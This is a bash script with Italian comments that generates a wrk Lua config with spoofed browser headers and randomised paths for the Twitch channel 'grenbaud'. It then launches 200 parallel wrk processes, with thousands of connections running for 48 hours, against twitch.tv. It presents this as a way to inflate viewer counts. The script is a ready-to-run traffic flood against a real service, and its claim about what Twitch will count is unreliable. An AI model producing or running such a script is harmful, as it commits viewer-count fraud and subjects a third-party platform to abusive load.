#!/bin/bash
# twitch_grenbaud_UNLIMITED.sh - COMPLETO (Crea Lua + Avvia ILLIMITATO)

echo "🚀 Creazione grenbaud_wrk.lua ILLIMITATO..."

cat > grenbaud_wrk.lua << 'EOF'
wrk.method = "GET"
wrk.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
wrk.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
wrk.headers["Accept-Language"] = "en-US,en;q=0.5"
wrk.headers["Accept-Encoding"] = "gzip, deflate, br"
wrk.headers["Referer"] = "https://www.twitch.tv/"
wrk.headers["Sec-Fetch-Dest"] = "document"
wrk.headers["Sec-Fetch-Mode"] = "navigate"
wrk.headers["Sec-Fetch-Site"] = "same-origin"
wrk.headers["Sec-Fetch-User"] = "?1"
wrk.headers["Cache-Control"] = "no-cache"
wrk.headers["Pragma"] = "no-cache"
wrk.headers["Connection"] = "keep-alive"

path = "/grenbaud"

local paths = {
  "/grenbaud",
  "/grenbaud?player=web", 
  "/grenbaud/chat",
  "/grenbaud/embed",
  "/grenbaud/popout",
  "/grenbaud/directory/game/Just%20Chatting"
}

request = function()
  local rand_path = paths[math.random(1, #paths)]
  return wrk.format(nil, rand_path)
end
EOF

echo "✅ Lua creato! Avvio UNLIMITED VIEWERS..."

# AVVIO MASSIVO - 200 VIEWERS (3200+ concurrent)
for i in {1..200}; do
  wrk -t16 -c50 -d48h -s grenbaud_wrk.lua --latency https://www.twitch.tv:443 >/dev/null 2>&1 &
  echo -n "⚡ $i "
  sleep 0.1
done

echo ""
echo "🎯 200 VIEWERS LIVE! (8000+ concurrent totali)"
echo "📊 Monitor views: watch 'ps aux | grep wrk | wc -l'"
echo "📊 Monitor connessioni: watch -n1 'netstat -an | grep :443 | grep ESTAB | wc -l'"
echo "🛑 STOP: pkill wrk"
echo "🔥 Twitch vede: 200+ viewers su grenbaud 📈"
